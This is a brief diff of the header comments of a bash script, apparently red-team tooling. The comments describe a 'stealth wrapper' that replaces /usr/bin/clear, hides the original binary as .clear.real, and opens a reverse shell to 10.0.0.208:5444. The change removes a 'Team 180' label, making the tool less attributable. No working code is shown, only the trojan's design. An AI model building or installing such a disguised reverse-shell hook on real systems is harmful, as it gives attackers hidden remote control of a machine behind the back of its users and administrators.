@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# === Team 180 Reverse Shell Hook for 'clear' ===
+# === Reverse Shell Hook for 'clear' ===
 # Reverse shell: 10.0.0.208:5444
 # Drops a stealth wrapper in /usr/bin/clear
 # Preserves original /usr/bin/clear as .clear.real
